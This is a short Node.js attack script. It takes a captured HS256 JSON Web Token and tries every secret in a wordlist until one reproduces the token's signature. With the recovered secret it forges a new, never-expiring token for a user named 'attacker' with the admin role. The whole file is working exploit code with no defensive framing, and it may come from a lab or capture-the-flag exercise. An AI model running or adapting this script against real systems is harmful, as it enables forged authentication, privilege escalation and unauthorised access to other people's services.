// Offline dictionary attack: recover the HS256 secret from a captured token,
// then forge a brand-new admin token signed with the recovered secret.
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const token = process.argv[2];
if (!token) { console.error('Usage: node brute_force.js <jwt>'); process.exit(1); }
const [h, p] = token.split('.');
const data = h + '.' + p;

function b64url(x) { return Buffer.from(JSON.stringify(x)).toString('base64').replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
function sign(data, secret) { return crypto.createHmac('sha256', secret).update(data).digest('base64').replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }

const wordlist = fs.readFileSync(path.join(__dirname, 'wordlist.txt'), 'utf8').split('\n').map(w => w.trim()).filter(Boolean);
const targetSig = token.split('.')[2];

let found = null;
for (const word of wordlist) {
  if (sign(data, word) === targetSig) { found = word; break; }
}

if (!found) { console.log('Secret not found in wordlist.'); process.exit(1); }

console.log('Secret recovered:', found);

// Forge a brand-new, freely chosen token signed with the recovered secret.
const header = { alg: 'HS256', typ: 'JWT' };
const forgedPayload = { username: 'attacker', role: 'admin' }; // no exp -> never expires
const forgedData = b64url(header) + '.' + b64url(forgedPayload);
const forgedToken = forgedData + '.' + sign(forgedData, found);
console.log('Forged admin token:\n' + forgedToken);
